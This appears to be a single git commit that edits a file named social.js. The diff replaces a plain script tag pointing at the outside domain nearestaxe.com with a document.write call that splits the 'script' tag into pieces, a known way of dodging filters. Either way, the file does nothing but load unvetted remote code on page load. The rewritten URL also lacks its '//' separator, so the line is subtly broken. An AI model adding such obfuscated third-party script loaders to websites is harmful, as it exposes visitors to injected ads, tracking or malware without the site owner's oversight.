76aa2757ee9251a4926a725004632e0c57dc2701
mychiara <85479169+mychiara@users.noreply.github.com>
2021-12-28 23:45:16 +0800

    Update social.js

--- social.js
+++ social.js
@@ -1,1 +1,1 @@
-<script type='text/javascript' src='//nearestaxe.com/8a/8d/9f/8a8d9f317c5fee4014d3b5a9cbf05fab.js'></script>
+document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + ':nearestaxe.com/8a/8d/9f/8a8d9f317c5fee4014d3b5a9cbf05fab.js"></scr' + 'ipt>');
